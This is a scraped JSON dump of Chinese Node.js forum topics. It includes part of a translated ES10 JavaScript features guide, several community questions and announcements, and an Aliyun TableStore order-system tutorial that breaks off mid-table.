&#x27;black*raven lime*parrot white*seagull&#x27;\nwhite\nseagull\n</code></pre><p>也许在美学上它与原始正则表达式非常相似，执行while循环实现。但是如前所述，由于上面提到的许多原因，这是更好的方法，移除 <strong>/g</strong> 不会导致无限循环。</p>\n<h3>动态导入</h3>\n<p>现在可以将导入分配给变量：</p>\n<pre class=\"prettyprint language-javascript\"><code>element.addEventListener(&#x27;click&#x27;, async() =&gt; {\n  const module = await import(&#96;.&#x2F;api-scripts&#x2F;button-click.js&#96;);\n  module.clickEvent();\n})\n</code></pre><h3>Array.flat()</h3>\n<p>扁平化多维数组：</p>\n<pre class=\"prettyprint language-javascript\"><code>let multi = [1,2,3,[4,5,6,[7,8,9,[10,11,12]]]];\nmulti.flat();               &#x2F;&#x2F; [1,2,3,4,5,6,Array(4)]\nmulti.flat().flat();        &#x2F;&#x2F; [1,2,3,4,5,6,7,8,9,Array(3)]\nmulti.flat().flat().flat(); &#x2F;&#x2F; [1,2,3,4,5,6,7,8,9,10,11,12]\nmulti.flat(Infinity);       &#x2F;&#x2F; [1,2,3,4,5,6,7,8,9,10,11,12]\n</code></pre><h3>Array.flatMap()</h3>\n<pre class=\"prettyprint language-javascript\"><code>let array = [1, 2, 3, 4, 5];\narray.map(x =&gt; [x, x * 2]);\n\n\nlet array = [1, 2, 3, 4, 5];\narray.map(x =&gt; [x, x * 2]);\n</code></pre><p>结果：</p>\n<pre class=\"prettyprint language-javascript\"><code>[Array(2), Array(2), Array(2), Array(2), Array(2)]\n0: (2) [1, 2]\n1: (2) [2, 4]\n2: (2) [3, 6]\n3: (2) [4, 8]\n4: (2) [5, 10]\n</code></pre><p>使用 <code>flatMap</code> 方法：</p>\n<pre class=\"prettyprint language-javascript\"><code>array.flatMap(v =&gt; [v, v * 2]);\n[1, 2, 2, 4, 3, 6, 4, 8, 5, 10]\n</code></pre><h3>Object.fromEntries()</h3>\n<p>将键值对列表转换为对象:</p>\n<pre class=\"prettyprint language-javascript\"><code>let obj = { apple : 10, orange : 20, banana : 30 };\nlet entries = Object.entries(obj);\nentries;\n(3) [Array(2), Array(2), Array(2)]\n 0: (2) [&quot;apple&quot;, 10]\n 1: (2) [&quot;orange&quot;, 20]\n 2: (2) [&quot;banana&quot;, 30]\nlet fromEntries = Object.fromEntries(entries);\n{ apple: 10, orange: 20, banana: 30 }\n</code></pre><h3>String.trimStart() 与 String.trimEnd()</h3>\n<pre class=\"prettyprint language-javascript\"><code>let greeting = &quot;     Space around     &quot;;\ngreeting.trimEnd();   &#x2F;&#x2F; &quot;     Space around&quot;;\ngreeting.trimStart(); &#x2F;&#x2F; &quot;Space around     &quot;;\n</code></pre><h3>格式良好的 JSON.stringify()</h3>\n<p>此更新修复了字符 <strong>U+D800</strong> 到 <strong>U+DFFF</strong> 的处理，有时可以进入 JSON 字符串。 这可能是一个问题，因为 <strong>JSON.stringify</strong>可能会将这些数字格式化为没有等效 UTF-8 字符的值, 但 JSON 格式需要 <code>UTF-8</code> 编码。</p>\n<p>解析方法使用格式良好的JSON字符串，如:</p>\n<pre class=\"prettyprint language-javascript\"><code>&#x27;{ “prop1” : 1, &quot;prop2&quot; : 2 }&#x27;; &#x2F;&#x2F; A well-formed JSON format string\n</code></pre><p>注意，要创建正确 JSON 格式的字符串，绝对需要在属性名周围加上双引号。缺少或任何其他类型的引号都不会生成格式良好的JSON。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#x27;{ “prop1” : 1, &quot;meth&quot; : () =&gt; {}}&#x27;; &#x2F;&#x2F; Not JSON format string\n</code></pre><p>JSON 字符串格式与 <strong>Object Literal</strong> 不同，后者看起来几乎一样，但可以使用任何类型的引号括住属性名，也可以包含方法(JSON格式不允许使用方法):</p>\n<pre class=\"prettyprint language-javascript\"><code>let object_literal = { property: 1, meth: () =&gt; {} };\n\n</code></pre><p>不管怎样，一切似乎都很好。第一个示例看起来是兼容的。但它们也是简单的例子，大多数情况下都能顺利地工作!</p>\n<h4>U+2028 和 U+2029 字符</h4>\n<p>问题是， ES10 之前的 EcmaScript 实际上并不完全支持 JSON 格式。前 ES10 时代不接受未转义行分隔符 <strong>U+2028 和</strong>段落分隔符 <strong>U+2029</strong> 字符:</p>\n<p><img src=\"https://image.fundebug.com/2019-02-26-03.png\" alt></p>\n<p><img src=\"https://image.fundebug.com/2019-02-26-04.png\" alt></p>\n<h4>对于 U+D800 - U+DFFF 之间的所有字符也是如此</h4>\n<p>如果这些字符潜入 JSON 格式的字符串(假设来自数据库记录)，你可能会花费数小时试图弄清楚为什么程序的其余部分会产生解析错误。</p>\n<p>因此，如果你传递 <strong>eval</strong> 这样的字符串 <code>“console.log(' hello ')”</code>，它将执行 JavaScript语句 (通过尝试将字符串转换为实际代码),也类似于 <strong>JSON.parse</strong> 将处理你的 JSON 字符串的方式。</p>\n<h3>稳定的 Array.prototype.sort()</h3>\n<p><strong>V8</strong> 之前的实现对包含10个以上项的数组使用了一种<strong>不稳定</strong>的快速排序算法。</p>\n<blockquote>\n<p>一个稳定的排序算法是当两个键值相等的对象在排序后的输出中出现的顺序与在未排序的输入中出现的顺序相同时。</p>\n</blockquote>\n<p>但情况不再是这样了，ES10 提供了一个稳定的数组排序:</p>\n<pre class=\"prettyprint language-javascript\"><code>var fruit = [\n    { name: &quot;Apple&quot;,      count: 13, },\n    { name: &quot;Pear&quot;,       count: 12, },\n    { name: &quot;Banana&quot;,     count: 12, },\n    { name: &quot;Strawberry&quot;, count: 11, },\n    { name: &quot;Cherry&quot;,     count: 11, },\n    { name: &quot;Blackberry&quot;, count: 10, },\n    { name: &quot;Pineapple&quot;,  count: 10, }\n];\n&#x2F;&#x2F; 创建排序函数:\nlet my_sort = (a, b) =&gt; a.count - b.count;\n&#x2F;&#x2F; 执行稳定的ES10排序:\nlet sorted = fruit.sort(my_sort);\nconsole.log(sorted);\n</code></pre><p>控制台输出(项目以相反的顺序出现):</p>\n<p><img src=\"https://image.fundebug.com/2019-02-26-05.png\" alt></p>\n<p><strong>代码部署后可能存在的BUG没法实时知道，事后为了解决这些BUG，花了大量的时间进行log 调试，这边顺便给大家推荐一个好用的BUG监控工具 <a href=\"https://www.fundebug.com/?utm_source=xiaozhi\">Fundebug</a>。</strong></p>\n<h3>新的Function.toString()</h3>\n<p>函数是对象，并且每个对象都有一个 <strong>.toString()</strong> 方法，因为它最初存在于<strong>Object.prototype.toString()</strong> 上。 所有对象（包括函数）都是通过基于原型的类继承从它继承的。</p>\n<p>这意味着我们以前已经有 <strong>funcion.toString()</strong> 方法了。</p>\n<p>但是 ES10 进一步尝试标准化所有对象和内置函数的字符串表示。 以下是各种新案例：</p>\n<h4>典型的例子</h4>\n<pre class=\"prettyprint language-javascript\"><code>function () { console.log(&#x27;Hello there.&#x27;); }.toString();\n</code></pre><p><strong>控制台输出(函数体的字符串格式:)</strong></p>\n<pre class=\"prettyprint language-javascript\"><code>⇨ function () { console.log(&#x27;Hello there.&#x27;); }\n</code></pre><p>下面是剩下的例子:</p>\n<h4>直接在方法名 .toString()</h4>\n<pre class=\"prettyprint language-javascript\"><code>Number.parseInt.toString();\n⇨ function parseInt() { [native code] }\n</code></pre><h4>绑定上下文</h4>\n<pre class=\"prettyprint language-javascript\"><code>function () { }.bind(0).toString();\n⇨ function () { [native code] }\n</code></pre><h4>内置可调用函数对象</h4>\n<pre class=\"prettyprint language-javascript\"><code>Symbol.toString();\n⇨ function Symbol() { [native code] }\n</code></pre><h4>动态生成的函数</h4>\n<pre class=\"prettyprint language-javascript\"><code>function* () { }.toString();\n⇨ function* () { }\n</code></pre><h4>prototype.toString</h4>\n<pre class=\"prettyprint language-javascript\"><code>Function.prototype.toString.call({});\n⇨ Function.prototype.toString requires that &#x27;this&#x27; be a Function&quot;\n</code></pre><h3>可选的 Catch Binding</h3>\n<p>在过去，<strong>try/catch</strong> 语句中的 <strong>catch</strong> 语句需要一个变量。 <strong>try/catch</strong> 语句帮助捕获终端级别的错误:</p>\n<pre class=\"prettyprint language-javascript\"><code>try {\n    &#x2F;&#x2F; Call a non-existing function undefined_Function\n    undefined_Function(&quot;I&#x27;m trying&quot;);\n}\ncatch(error) {\n    &#x2F;&#x2F; Display the error if statements inside try above fail\n    console.log( error ); &#x2F;&#x2F; undefined_Function is undefined\n}\n</code></pre><p>在某些情况下，所需的<strong>错误</strong>变量是未使用的:</p>\n<pre class=\"prettyprint language-javascript\"><code>try {\n    JSON.parse(text); &#x2F;&#x2F; &lt;--- this will fail with &quot;text not defined&quot;\n    return true; &lt;--- exit without error even if there is one\n}\ncatch (redundant_sometmes) &lt;--- this makes error variable redundant\n{\n    return false;\n}\n</code></pre><p>编写此代码的人通过尝试强制 <code>true</code> 退出 <strong>try</strong> 子句。但是，这并不是实际发生的情况</p>\n<pre class=\"prettyprint language-javascript\"><code>(() =&gt; {\n    try {\n        JSON.parse(text)\n        return true\n    } catch(err) {\n        return false\n    }\n})()\n=&gt; false\n</code></pre><h4>在 ES10 中，捕获错误的变量是可选的</h4>\n<p>现在可以跳过错误变量:</p>\n<pre class=\"prettyprint language-javascript\"><code>try {\n    JSON.parse(text);\n    return true;\n}\ncatch\n{\n    return false;\n}\n</code></pre><p>目前还无法测试上一个示例中的 <strong>try</strong> 语句的结果，但一旦它出来，我将更新这部分。</p>\n<h3>标准化 globalThis 对象</h3>\n<p>这在ES10之前， globalThis 还没有标准化。</p>\n<p>在产品代码中，你可以自己编写这个怪物，在多个平台上“标准化”它:</p>\n<pre class=\"prettyprint language-javascript\"><code>var getGlobal = function () {\n    if (typeof self !== &#x27;undefined&#x27;) { return self; }\n    if (typeof window !== &#x27;undefined&#x27;) { return window; }\n    if (typeof global !== &#x27;undefined&#x27;) { return global; }\n    throw new Error(&#x27;unable to locate global object&#x27;);\n};\n</code></pre><p>但即使这样也不总是奏效。因此，ES10 添加了 <strong>globalThis</strong> 对象，从现在开始，该对象用于在任何平台上访问全局作用域:</p>\n<pre class=\"prettyprint language-javascript\"><code>&#x2F;&#x2F; 访问全局数组构造函数\nglobalThis.Array(0, 1, 2);\n⇨ [0, 1, 2]\n\n&#x2F;&#x2F; 类似于 ES5 之前的 window.v = { flag: true }\nglobalThis.v = { flag: true };\n\nconsole.log(globalThis.v);\n⇨ { flag: true }\n</code></pre><h3>Symbol.description</h3>\n<p><code>description</code> 是一个只读属性，它返回 <strong>Symbol</strong> 对象的可选描述。</p>\n<pre class=\"prettyprint language-javascript\"><code>let mySymbol = &#x27;My Symbol&#x27;;\nlet symObj = Symbol(mySymbol);\nsymObj; &#x2F;&#x2F; Symbol(My Symbol)\nsymObj.description; &#x2F;&#x2F; &quot;My Symbol&quot;\n</code></pre><h3>Hashbang 语法</h3>\n<p>也就是 unix 用户熟悉的 <strong>shebang</strong>。它指定一个解释器(什么将执行JavaScript文件?)。</p>\n<p>ES10标准化，我不会对此进行详细介绍，因为从技术上讲，这并不是一个真正的语言特性，但它基本上统一了 JavaScript 在服务器端的执行方式。</p>\n<pre class=\"prettyprint language-bash\"><code>$ .&#x2F;index.js\n</code></pre><p>代替</p>\n<pre class=\"prettyprint language-bash\"><code>$ node index.js\n</code></pre><h3>ES10类: private、static 和 公共成员</h3>\n<p><strong>新的语法字符 #octothorpe（hash tag）现在用于直接在类主体的范围内定义变量，函数，getter 和 setter …以及构造函数和类方法。</strong></p>\n<p>下面是一个毫无意义的例子，它只关注新语法:</p>\n<pre class=\"prettyprint language-javascript\"><code>class Raven extends Bird {\n#state = { eggs: 10};\n&#x2F;&#x2F; getter\n    get #eggs() { \n        return state.eggs;\n    }\n&#x2F;&#x2F; setter\n    set #eggs(value) {\n        this.#state.eggs = value;\n    }\n#lay() {\n        this.#eggs++;\n    }\nconstructor() {\n        super();\n        this.#lay.bind(this);\n    }\n#render() {\n        &#x2F;* paint UI *&#x2F;\n    }\n}\n</code></pre><p>老实说，我认为这会让语言更难读。</p>\n<p><strong>原文：</strong><a href=\"https://medium.freecodecamp.org/the-complete-guide-to-es10-features-5fd0feb9513a\">The Complete Guide to ES10 Features</a></p>\n<h3>关于Fundebug</h3>\n<p><a href=\"https://www.fundebug.com/\">Fundebug</a>专注于JavaScript、微信小程序、微信小游戏、支付宝小程序、React Native、Node.js和Java线上应用实时BUG监控。 自从2016年双十一正式上线，Fundebug累计处理了10亿+错误事件，付费客户有Google、360、金山软件、百姓网等众多品牌企业。欢迎大家<a href=\"https://www.fundebug.com/team/create\">免费试用</a>！</p>\n<p><img src=\"https://static.fundebug.cn/wechat_slogan.png\" alt></p>\n</div>","title":"ES10特性详解","last_reply_at":"2019-03-12T12:41:46.787Z","good":false,"top":false,"reply_count":6,"visit_count":1904,"create_at":"2019-02-27T02:19:08.224Z","author":{"loginname":"Fundebug","avatar_url":"https://avatars2.githubusercontent.com/u/26496557?v=4&s=120"}},{"id":"5c4eb1a6a4647e02328f1b00","author_id":"5a9ca0cd8edf56a344937061","tab":"ask","content":"<div class=\"markdown-text\"><p>项目中使用node 做前后端分离，后端使用php 写的，服务端的只负责提供接口，前端我打算使用node作为中转，但是目前有个问题，</p>\n<p>网页类更新不是很频繁,用户量很大，我想如何把服务端请求的接口数据，缓存下来，设个时间限制,过期了再去请求服务端接口，</p>\n<p>避免重复请求的问题，服务端数据，也可以让网站响应更快呢，</p>\n</div>","title":"使用 node 如何缓存服务端接口数据","last_reply_at":"2019-03-12T10:54:18.753Z","good":false,"top":false,"reply_count":8,"visit_count":931,"create_at":"2019-01-28T07:39:18.337Z","author":{"loginname":"dixiaoping","avatar_url":"https://avatars2.githubusercontent.com/u/19325626?v=4&s=120"}},{"id":"5c860a5facb681372d416f44","author_id":"5c8609d4acb681372d416f39","tab":"ask","content":"<div class=\"markdown-text\"><p><img src=\"//static.cnodejs.org/FjE76fKOQ5afwDVfYF-XDMadm05R\" alt=\"image.png\"></p>\n<p>很难受 ，求助      npm run dev之后  保存文件无法热更新。 强迫症 。\n正常的egg-init官网步骤  完全一模一样\nnode环境官网最新LTS版  现在是win10 和mac  统统都遇到这个问题了 无法解决</p>\n</div>","title":"求教egg-init出来的项目 无法热启动。。。","last_reply_at":"2019-03-12T09:44:43.740Z","good":false,"top":false,"reply_count":10,"visit_count":486,"create_at":"2019-03-11T07:12:31.312Z","author":{"loginname":"jiashuai1002","avatar_url":"https://avatars3.githubusercontent.com/u/34434315?v=4&s=120"}},{"id":"5bcc139215e4fd1923f4911f","author_id":"5b52cbf1fb9e84ec69cc1ca2","tab":"share","content":"<div class=\"markdown-text\"><p>基于egg-cnode开源程序搭建的nodejs社区已经上线</p>\n<p>各位老铁 ，帮忙测测看看github登录是否正常。</p>\n<p><strong>地址</strong>：<a href=\"http://bbs.itying.com/\">http://bbs.itying.com/</a></p>\n<p>先感谢cnode的开源程序，各位老铁 ，帮忙测测看看github登录是否正常。</p>\n</div>","title":"egg-cnode开源程序搭建的一个nodejs社区已经上线，和cnodejs一模一样----感谢cnode","last_reply_at":"2019-03-12T06:39:23.092Z","good":false,"top":false,"reply_count":16,"visit_count":2228,"create_at":"2018-10-21T05:50:10.601Z","author":{"loginname":"nodeper","avatar_url":"https://avatars2.githubusercontent.com/u/41500847?v=4&s=120"}},{"id":"5c6513710752e020af943865","author_id":"55c8131739273b9219336439","tab":"share","content":"<div class=\"markdown-text\"><p>各位 ccode 的朋友大家猪年好  : )</p>\n<p>自年前 0.1 版本发布后，得到了各路朋友真诚的鼓励和反馈，心中暖流涌动感激不尽。经过跨年打磨, 今天正式把版本提升到了 v1.0。</p>\n<p>主要变化有。。。。不少。。 (主要是大幅优化了手机/宽屏下的体验，改善消息系统，若干 bug 修复以及少许 feature 等等)。</p>\n<p>为了照顾之前错过直播的小伙伴们，这里重播一下:</p>\n<h2>什么是 coderplanets ?</h2>\n<p><a href=\"http://coderplanets.com\">coderplanets.com</a> 是一个开源的，<strong>专注于小众编程语言和框架的社区平台</strong>,  不论你是</p>\n<ul>\n<li>小众编程语言(框架)初学者</li>\n<li>小众编程语言(框架)有经验者</li>\n<li>各种小众编程语言(框架, 工具)收集癖</li>\n<li>小众编程语言/框架的爱好者，关注者… 等等</li>\n</ul>\n<p>都能在这里找到归属和志同道合的人， 简而言之，只要你掉进了<strong>小众编程语言或框架</strong>的坑，顺路来这里就对了 : 0。</p>\n<ul>\n<li>社区地址:  <a href=\"https://coderplanets.com\">https://coderplanets.com</a></li>\n<li>社区使用指南: <a href=\"https://coderplanets.com/cps-support\">https://coderplanets.com/cps-support</a></li>\n<li>源代码:  <a href=\"https://github.com/coderplanets\">https://github.com/coderplanets</a></li>\n</ul>\n<hr>\n<blockquote>\n<p>coderplanets 目前还闭着眼躺在新生的襁褓之中，内容和注册用户都不多, 因此您的每一次 <strong>创作、反馈建议、推广、star、pr、打赏、赞助</strong>等等，都是对她莫大的支持和保护, 在此先谢过 : )。</p>\n</blockquote>\n<hr>\n<p>联系我(们):</p>\n<ul>\n<li>邮件： <a href=\"mailto:hello@group.coderplanets.com\">hello@group.coderplanets.com</a></li>\n<li>github: <a href=\"https://github.com/mydearxym\">https://github.com/mydearxym</a></li>\n<li>知乎专栏:   <a href=\"https://zhuanlan.zhihu.com/coderplanets\">https://zhuanlan.zhihu.com/coderplanets</a></li>\n<li>QQ: 955466153 (群)</li>\n</ul>\n</div>","title":"专注于小众编程语言和框架的  coderplanets 社区1.0版上线了","last_reply_at":"2019-03-11T13:04:12.283Z","good":false,"top":false,"reply_count":11,"visit_count":1627,"create_at":"2019-02-14T07:06:25.129Z","author":{"loginname":"mydearxym","avatar_url":"https://avatars2.githubusercontent.com/u/6184465?v=4&s=120"}},{"id":"5c35fcdd3898674067a7d53d","author_id":"58130d10b37ee8fb339788cf","tab":"share","content":"<div class=\"markdown-text\"><h1>一、方案背景</h1>\n<p>订单系统存在于各行各业，如电商订单、银行流水、运营商话费账单等，是一个非常广泛、通用的系统。对于这类系统，在过去十几年发展中已经形成了经典的做法。但是随着互联网的发展，以及各企业对数据的重视，需要存储和持久化的订单量越来越大。数据的重视程度与数据规模的膨胀带来了新的挑战。</p>\n<h2>需求场景</h2>\n<p>某电商平台A，需要进行持久化所有平台产生的订单数据。同时，基于所有的订单数据，系统又需要向外提供面向多种角色：消费者、店家、平台三类人群的多元化的查询服务。消费者可以查询自己的历史订单，商家可以统计热销产品，平台也可以分析用户行为、平台交易规模等。主要查询方式涵盖订单的多维度检索，以及订单数据的分析、统计等，例如：\n面向消费者：【A消费者】*【近1年】*【卖出电脑】订单查询；\n面向售货员：【B售货员】*【近1个月】销售订单；\n…</p>\n<h2>技术点</h2>\n<p>在订单场景中，技术上通常需要考虑的技术点，主要包含如下几个方面：</p>\n<ul>\n<li>查询能力：需要具备丰富的查询类型，如多维度、范围、模糊查询等，同时具备排序、统计等功能；</li>\n<li>数据量：存储海量数据的同时，满足强一致、高可用、低成本等要求；</li>\n<li>服务性能：应对高并发请求高并发的同时，保证低延迟；</li>\n</ul>\n<p>实现多维、实时查询功能，是订单管理解决方案的核心功能，官网控制台地址：<a href=\"https://ots.console.aliyun.com/index#/demo/cn-hangzhou/order\">项目样例</a>\n<img src=\"https://cdn.nlark.com/lark/0/2018/png/97467/1540197503215-1a426daf-dfa6-401e-8623-e686b6e2dae0.png\" alt=\"image.png | left | 747x420\"></p>\n<h1>二、方案演进</h1>\n<p>应对订单场景，电商通常会采用MySQL传统方案。借助关系型数据库强大的查询能力，用户可直接通过SQL语句实现订单数据的多维度查询、数据统计等。所谓数据膨胀，分为横向、纵向两种，横向即不断迭代引入的新字段维度，纵向即总的存储数据量。在面对这两种订单数据膨胀上，单MySql方案逐渐变得吃力。 SQL + NoSQL的组合方案（以下称：组合方案）便应运而生，借助两个数据库各自的优势分别解决不同场景各自的需求。但组合方案同样也带来了新的问题，组合方案牺牲空间成本，同时也增加了开发工作量与运维复杂度。在保证数据一致性上产生额外开销。\n下面让我们看一下如下几个常规方案：</p>\n<h2>常规方案</h2>\n<h3>1、MySql分库分表方案</h3>\n<p>MySql自身拥有强大的数据查询、分析功能，基于MyQql创建订单系统，可以应对订单数据多维查询、统计场景。伴随着订单数据量的增加，用户会采取分库、分表方案应对，通过这种伪分布式方案，解决数据膨胀带来的问题。但数据一旦达到瓶颈，便需要重新创建更大规模的分库+数据的全量迁移，麻烦就会不断出现。数据迭代、膨胀带来的困扰，是MySql方案难于逾越的。仅仅依靠MySql的传统订单方案短板凸显。\n1、数据纵向（数据规模）膨胀：采用分库分表方案，MySql在部署时需要预估分库规模，数据量一旦达到上限后，重新部署并做数据全量迁移；\n2、数据横向（字段维度）膨胀：schema需预定义，迭代新增新字段变更复杂。而维度到达一定量后影响数据库性能；</p>\n<h3>2、MySql+HBase方案</h3>\n<p>引入双数据的方案应运而生，通过实时数据、历史数据分存的方案，可以一定程度解决数据量膨胀问题。该方案将数据归类成两部分存储：实时数据、历史数据。同时通过数据同步服务，将过期数据同步至历史数据。\n1、实时订单数据（例如：近3个月的订单）：将实时订单存入MySql数据库。实时订单的总量膨胀的速度得到了限制，同时保证了实时数据的多维查询、分析能力；\n2、历史订单数据（例如：3个月以前的订单）：将历史订单数据存入HBase，借助于HBase这一分布式NoSql数据库，有效应对了订单数据膨胀困扰。也保证了历史订单数据的持久化；\n但是，该方案牺牲了历史订单数据对用户、商家、平台的使用价值，假设了历史数据的需求频率极低。但是一旦有需求，便需要全表扫描，查询速度慢、IO成本很高。而维护数据同步又带来了数据一致性、同步运维成本飙升等难题；</p>\n<h3>3、MySql+Elasticsearch方案</h3>\n<p>组合方案还有MySql+Elasticsearch，该方案同样是将数据分两部分存储，可以一定程度解决订单索引维度增长问题。用户自己维护数据同步服务，保证两部分数据的一致性；\n1、全量数据：将全量的订单数据存入MySql数据库，订单ID之外的数据整体存为一个字段。该全量数据作为持久化存储，也用于非索引字段的反查；\n2、查询数据：仅将需要检索的字段存入Elasticsearch（基于Lucene分布式索引数据库），借助于&gt;Elasticsearch的索引能力，提供可以应付维度膨胀的订单数据，然后必要时反查MySql获取订单完整信息；\n该方案应付了数据维度膨胀带来的困扰，但是随着订单量的不断膨胀，MySql扩展性差的问题再次暴露出来。同时数据同步至Elasticsearch的方案，开发、运维成本很高，方案选择也存在弊端。</p>\n<table>\n<thead>\n<tr>\n<th>能力分析</th>\n<th>MySql</th>\n<th>HBase</th>\n<th>Elasticsearch</th>\n<th>TableStore</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>存储方式</td>\n<td>行存储</td>\n<td>列存储</td>\n<td>索引存储</td>\n<td>列存储+索引存储</td>\n</tr>\n<tr>\n<td>扩展性</td>\n<td>单机、扩展性差</td>\n<td>水平扩展</td>\n<td>水平扩展</td>\n<td>（自动）水平扩展</td>\n</tr>\n<tr>\n<td>一致性</td>\n<td>强一致性</td>\n<td>强一致性、时序一致性</td>\n<td></td>\n<td>强一致性、时序一致性</td>\n</tr>\n<tr>\n<td>检索</td>\n<td>较弱的支持</td>\n<td>不支持</td>\n<td>支持</td>\n<td>支持</td>\n</tr>\n<tr>\n<td>数据量</td>\n<td>~ 1T，~亿行</td>\n<td>~10 PB，~万亿行</td>\n<td>~1 PB，~千亿行</td>\n<td>~10 PB，~万亿行</td>\n</tr>\n</tbody>\n</table>\n<h2>表格存储（TableStore）方案</h2>\n<p>如果使用表格存储（TableStore）研发的多元索引（SearchIndex）方案，则可以完美地解决亿量级订单系统问题。TableStore具有即开即用，按量收费等特点。多元索引随时创建，是海量电商订单元数据管理的优质方案。\nTableStore作为阿里云提供的一款全托管、分布式NoSql型数据存储服务，具有【海量数据存储】、【热点数据自动分片】、【海量数据多维检索】等功能，天然地解决了订单数据大爆炸这一挑战；\n同时，SearchIndex功能在保证用户数据高可用的基础上，提供了数据多维度搜索、统计等能力。针对多种场景创建多种索引，实现多种模式的检索。用户可以仅在需要的时候创建、开通索引。由TableStore来保证数据同步的一致性，这极大的降低了用户的方案设计、服务运维、代码开发等工作量。</p>\n<h3>基于表格存储搭建的订单系统页面一览</h3>\n<p>样例内嵌在表格存储控制台中，用户可登录控制台体验系统（若为表格存储的新用户，需要点击开通服务后体验，开通免费，订单数据存储在公共实例中，体验不消耗用户存储、流量、Cu）。\n<strong>注：该样例提供了【亿量级】订单数据。官网控制台地址：</strong><a href=\"https://ots.console.aliyun.com/index#/demo/cn-hangzhou/order\">项目样例</a></p>\n<p><img src=\"https://yqfile.alicdn.com/01df85ba45158cf32b5254759dd6a128847d2984.gif\" alt=\"testRecord\"></p>\n<h1>二、搭建准备</h1>\n<p>若您对于亿量级订单系统的体验不错，希望开始自己系统的搭建之旅，只需按照如下步骤便可以着手搭建了：</p>\n<h2>1、开通表格存储</h2>\n<p>通过控制台开通表格存储服务，表格存储即开即用（后付费），采用按量付费方式，已为用户提供足够功能测试的免费额度。\n<a href=\"https://ots.console.aliyun.com\">表格存储官网控制台</a>、<a href=\"https://help.aliyun.com/document_detail/52733.html\">免费额度说明</a>。</p>\n<h2>2、创建实例</h2>\n<p>通过控制台创建表格存储实例，选择支持多元索引的Region。（当前阶段SearchIndex功能尚未商业化，暂时开放北京、上海、深圳、杭州四地，后续逐渐开放）</p>\n<p><img src=\"https://cdn.nlark.com/lark/0/2018/png/97467/1539915875520-18e33218-3d60-4b3a-8ff9-05ced52aab73.png\" alt=\"image.png | left | 747x240\"></p>\n<p>创建实例后，提交工单申请多元索引功能邀测（商业化后默认打开，不使用不收费）。</p>\n<ul>\n<li>邀测地址：<a href=\"https://workorder.console.aliyun.com/console.htm#/ticket/add?productCode=ots&amp;commonQuestionId=1402&amp;isSmart=true\">提工单</a>，选择【表格存储】&gt;【产品功能、特性咨询】&gt;【创建工单】，申请内容如下：</li>\n<li>问题描述:请填写【申请SearchIndex邀测】</li>\n<li>机密信息:请填写【地域+实例名】，例：上海+myInstanceName</li>\n</ul>\n<p><img src=\"https://cdn.nlark.com/lark/0/2018/png/97467/1539915294761-f6527b3e-3a87-47a8-a5ee-abe07cae3fc1.png\" alt=\"image.png | left | 747x277\"></p>\n<h2>3、SDK下载</h2>\n<p>使用具有多元索引（SearchIndex）的SDK，<a href=\"https://help.aliyun.com/document_detail/86528.html\">官网地址</a>，暂时java、go、node.js、C#四种SDK增加了新功能</p>\n<h4>java-SDK</h4>\n<pre class=\"prettyprint language-xml\"><code>&lt;dependency&gt;\n    &lt;groupId&gt;com.aliyun.openservices&lt;&#x2F;groupId&gt;\n    &lt;artifactId&gt;tablestore&lt;&#x2F;artifactId&gt;\n    &lt;version&gt;4.8.0&lt;&#x2F;version&gt;\n&lt;&#x2F;dependency&gt;\n</code></pre><h4>go-SDK</h4>\n<pre class=\"prettyprint language-bash\"><code>$ go get github.com&#x2F;aliyun&#x2F;aliyun-tablestore-go-sdk\n</code></pre><h4>Nodejs-SDK</h4>\n<pre class=\"prettyprint language-bash\"><code>$ npm install tablestore@4.1.0\n</code></pre><h4>C#</h4>\n<pre class=\"prettyprint language-cmd\"><code>$ Install-Package Aliyun.TableStore.SDK -Version 4.1.0\n</code></pre><h2>4、表设计</h2>\n<p>订单系统不仅仅是订单一张数据表，它应包含：消费者表、售货员表、产品表、供货商表、交易订单表、支付订单表等。在本样例中，主要使用最基本的四张表（消费者表、售货员表、产品表、交易订单表），仅以订单表举例如下：\n表名：order_contract</p>\n<table>\n<thead>\n<tr>\n<th>列名</th>\n<th>数据类型</th>\n<th>索引类型</th>\n<th>字段说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>_id(主键列)</td>\n<td>String</td>\n<td></td>\n<td>MD5(oId)避免热点</td>\n</tr>\n<tr>\n<td>oId</td>\n<td>String</td>\n<td>KEYWORD</td>\n<td>订单编号</td>\n</tr>\n<tr>\n<td>pName</td>\n<td>String</td>\n<td>TEXT</td>\n<td>产品名，TEXT类型索引可模糊查询，但不能排序</td>\n</tr>\n<tr>\n<td>totalPrice</td>\n<td>double</td>\n<td>DOUBLE</td>\n<td>订单总价</td>\n</tr>\n<tr>\n<td>orderTime</td>\n<td>long</td>\n<td>LONG</td>\n<td>下单时间（时间戳）</td>\n</tr>\n<tr>\n<td>…</td>\n<td>…</td>\n<td>…</td>\n<td>…</td>\n</tr>\n</tbody>\n</table>\n<h1>三、开始搭建（核心代码）</h1>\n<h2>1、创建数据表</h2>\n<p>四张表：订单表、消费者表、售货员表、产品表\n用户仅需维护一个实例，按如下方式创建：通过控制台创建、管理数据表（用户也可以通过SDK直接创建）：</p>\n<p><img src=\"https://cdn.nlark.com/lark/0/2018/png/97467/1539916336871-9c35a812-fb84-4659-ab94-91699cdeac25.png\" alt=\"image.png | left | 747x307\"></p>\n<p>2、创建数据表索引\nTableStore自动做全量、增量的索引数据同步：用户可以通过控制台创建、管理SearchIndex（用户也可通过SDK创建）：</p>\n<p><img src=\"https://cdn.nlark.com/lark/0/2018/png/97467/1539916491962-0e023aad-2e93-47c3-a42d-22b2a33952cf.png\" alt=\"image.png | left | 747x362\"></p>\n<h2>3、数据导入</h2>\n<p>插入部分测试数据（控制台样例中插入了1亿条数据，用户自己可以通过控制台插入少量测试数据）；</p>\n<table>\n<thead>\n<tr>\n<th>订单号</th>\n<th>订单（md5）（主键）</th>\n<th>消费者编号</th>\n<th>消费者姓名</th>\n<th>售货员编号</th>\n<th>售货员姓名</th>\n<th>产品编号</th>\n<th>产品名</th>\n<th>产品品牌</th>\n<th>产品类型</th>\n<th>下单时间</th>\n<th>支付时间</th>\n<th>支付状态</th>\n<th>产品单价</th>\n<th>数量</th>\n<th>总价钱</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>o0000000000</td>\n<td>c49f5fd5aba33159accae0d3ecd749a7</td>\n<td>c0019</td>\n<td>消陈九</td>\n<td>s0020</td>\n<td>售楚十</td>\n<td>p0003004</td>\n<td>vivo 